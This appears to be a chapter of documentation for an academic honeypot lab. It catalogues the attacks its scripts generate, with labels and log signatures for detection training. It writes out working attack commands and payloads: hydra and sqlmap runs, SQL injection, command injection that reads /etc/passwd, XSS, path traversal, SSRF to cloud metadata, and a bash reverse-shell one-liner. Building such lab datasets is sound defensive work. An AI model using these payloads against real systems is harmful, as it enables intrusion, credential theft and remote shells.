# 11 ‚Äî Attacks

This document explains every attack class generated by the Computer 3
scripts, the tool(s) used, the vulnerable target, the expected log signature,
and the corresponding `attack_class` label.

## 11.2 recon ‚Äî Reconnaissance

### nmap
- **Tool:** `nmap -sS -p- --min-rate 2000` and `nmap -A`.
- **What it does:** TCP SYN scan of all ports; service/version/OS detection.
- **Target:** every honeypot port.
- **Log signature:** many `recon` events with `user_agent` starting
  `nmap`/`masscan` (nmap's HTTP probing); TCP-level scans produce connection
  logs on the SSH/FTP/Telnet/printer honeypots.

### masscan
- **Tool:** `masscan <ip> -p1-65535 --rate=2000`.
- **What it does:** high-speed async SYN sweep.
- **Notes:** Optional (requires root, can flood the lab).

### gobuster / dirb
- **Tool:** `gobuster mode=dir -w wordlists/dirs.txt`.
- **What it does:** brute-forces web paths.
- **Target:** http (8080), camera (8081), router (8085).
- **Log signature:** `directory_enum` events for every 404/200 response.

### nikto
- **Tool:** `nikto -h <url> -Tuning 1,2,8,9`.
- **What it does:** web vulnerability scan, ~500 requests per target.
- **Log signature:** mix of `recon`, `directory_enum`, and occasional
  `sqli`/`cmdi` when nikto sends `'` or `;` payloads.

## 11.3 bruteforce ‚Äî Brute force authentication

### hydra SSH
- **Tool:** `hydra -L users.txt -P passwords.txt -s 2222 ssh://192.168.1.10`.
- **Target:** ssh container (2222).
- **Log signature:** one `ssh_brute_force` event per attempt; one
  `login_success` when `admin/admin` succeeds.

### hydra FTP
- **Target:** ftp container (2121). Discovers `root/toor`.

### hydra Telnet
- **Target:** telnet container (2323). Discovers `admin/admin`. Throttled to
  4 threads because Telnet is slow.

### hydra HTTP-POST-FORM
- **Target:** router login (8085). Discovers `admin/password`.

## 11.4 sqli ‚Äî SQL injection

### Manual (curl)
- `/login?u=admin'--&p=x` ‚Äî auth bypass.
- `/product?id=1 UNION SELECT user,pass,1 FROM users` ‚Äî UNION exfil.
- `/product?id='` ‚Äî error-based.

### sqlmap
- Detection: `sqlmap -u '.../product?id=1' --batch --level=3 --risk=2 --dbs`.
- Exploitation: `sqlmap -u '.../product?id=1' -D main -T users --dump`.
- **Result:** dumps `users` table ‚Üí `admin/s3cr3t`, `alice/alicepw`, `bob/bobpw`.

**Log signature:** `sql_injection`/`sqli` events.

## 11.5 cmdi ‚Äî Command injection

| Endpoint                                    | Payload              |
|---------------------------------------------|----------------------|
| http `/api/ping?host=`                      | `127.0.0.1;id`       |
| http `/api/ping?host=`                      | `127.0.0.1|id`       |
| http `/api/ping?host=`                      | `127.0.0.1&&id`      |
| http `/api/ping?host=`                      | `$(id)`              |
| http `/api/ping?host=`                      | `` `id` ``           |
| camera `/streams?id=`                       | `1;id`               |
| router `/api/diag?host=`                    | `127.0.0.1;cat /etc/passwd` |
| router `/api/wps?pin=`                      | `;id`                |
| smarttv `/app/install?pkg=`                 | `demo;id`            |
| nas `/api/snapshot?name=`                   | `snap;id`            |

All exploit `subprocess.run(f"... {user_input}", shell=True)`.

**Log signature:** `command_injection`/`cmdi` events.

## 11.6 xss ‚Äî Cross-site scripting

- `/search?q=<script>alert(1)</script>`
- `/search?q=<img src=x onerror=alert(1)>`
- `/search?q=<svg onload=alert(1)>`

The `http` app reflects `q` into the HTML response without escaping.

**Log signature:** `xss` events.

## 11.7 traversal ‚Äî Path traversal

- camera `/admin?file=../../etc/passwd`
- nas `/api/files?path=/etc/passwd`
- nas `/api/files?path=..\..\windows\win.ini`
- camera `/admin?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd` (URL-encoded)

All exploit `open(user_input)`.

**Log signature:** `path_traversal`/`traversal` events.

## 11.8 ssrf ‚Äî Server-side request forgery

- smarttv `/cast?url=http://127.0.0.1:9200/` (hits Elasticsearch internally)
- smarttv `/cast?url=file:///etc/passwd` (file scheme)
- smarttv `/cast?url=http://169.254.169.254/latest/meta-data/` (cloud metadata IP)

The `smarttv` app calls `urllib.request.urlopen(url)` with the user-supplied
URL.

**Log signature:** `ssrf` events.

## 11.9 exfil ‚Äî Data exfiltration

- sshpass + ssh into `admin/admin`, run `cat /etc/passwd`.
- curl `ftp://root:toor@.../pub/config.bak` (download).

**Log signature:** `ssh_command_exec`, `ftp_retr` ‚Üí `exfil`.

## 11.10 implant ‚Äî Implantation / upload

- curl `-T /tmp/fake_implant.txt ftp://root:toor@.../uploads/implant.txt` (FTP STOR).
- curl `-F f=@file http://.../upload` (HTTP file upload).

**Log signature:** `ftp_stor`, `file_upload` ‚Üí `implant`.

## 11.11 abuse ‚Äî Protocol abuse (printer PJL)

- Raw `@PJL FSDIRLIST NAME="0:/"` and `@PJL FSUPLOAD NAME="0:/etc/hostname"`
  to port 9100.

This is the classic printer attack class (see *Stuxnet's Printer Crawler* and
the *Printers Gone Wild* research in `18_References.md`).

**Log signature:** `printer_abuse` ‚Üí `abuse`.

## 11.12 dos (simulated) ‚Äî Denial of service simulation

- 200 rapid `curl` requests to `http://192.168.1.10:8080/`.

**Important:** This is a *simulation*, not a real L3/L4 DoS. The honeypot's
Flask server can handle 200 requests easily. The purpose is to create a
visible temporal cluster in the Kibana timeline + heatmap so the audience
can see what a DoS signature looks like.

**Log signature:** 200 `benign`-looking events clustered within ~10 seconds.
The ML taxonomy currently folds these into `benign` (no separate `dos`
class). Future work could add a `dos` class based on request-rate features
per source IP.

## 11.13 Reverse-shell simulation (NOT a real shell)

In `07_netcat.sh` we deliver the classic bash reverse-shell payload
`bash -i >&/dev/tcp/192.168.1.30/4444 0>&1` (URL-encoded) through the
`http /api/ping?host=` cmd-injection endpoint. We do **not** start a
listener ‚Äî the payload is captured in the honeypot log as an `implant`/`cmdi`
event, which is the academic objective.
